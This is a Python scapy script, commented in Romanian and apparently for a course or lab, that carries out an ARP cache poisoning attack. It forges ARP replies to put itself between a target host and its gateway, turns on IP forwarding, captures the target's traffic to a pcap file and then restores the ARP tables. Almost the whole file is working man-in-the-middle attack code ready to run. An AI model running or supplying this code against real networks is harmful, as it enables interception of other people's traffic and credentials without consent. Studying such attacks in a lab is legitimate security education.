from scapy.all import *
import os
import signal
import sys
import threading
import time

# Parametri pentru ARP Poisoning
from scapy.layers.l2 import ARP

gateway_ip = "198.7.0.1"
target_ip = "198.7.0.2"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 0

# Fiind data o adresă IP, obține adresa MAC. Se trimite un ARP Request broadcast pentru adresa IP.
# Ar trebui să se primească un ARP reply cu adresa MAC
def get_mac(ip_address):
    # Se construiește un request ARP. Funcția `sr` este utilizată pentru a trimite/primi un pachet de layer 3
    # Metoda alternativă pentru Layer 2: resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

# Restaurează rețeaua prin inversarea atacului ARP Poisoning. Se trimite un ARP Reply broadcast cu
# informații corecte despre adresa MAC și adresa IP
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    # Dezactivează IP Forwarding pe un MAC
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # Trimite un semnal de terminare procesului curent
    os.kill(os.getpid(), signal.SIGTERM)

# Continuă să trimită ARP replies false pentru a ne pune în mijloc pentru a intercepta pachetele
# Vom utiliza adresa MAC a interfeței noastre ca și hwsrc pentru ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            # Atacul de ARP Poisoning
            # păcălim ținta să creadă că suntem gateway-ul și gateway-ul să creadă că suntem ținta
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

# Pornim atacul ARP Poisoning
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
# Activează IP Forwarding pe un MAC
os.system("sysctl -w net.inet.ip.forwarding=1")
print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")

# Obține adresa MAC pentru gateway
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

# Obține adresa MAC pentru țintă
target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")

# Pornim un thread pentru a executa ARP Poisoning
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# Captăm traficul și scriem în fișier, filtrând după adresa IP a țintei
try:
    sniff_filter = "ip host " + target_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)


# sursa: https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242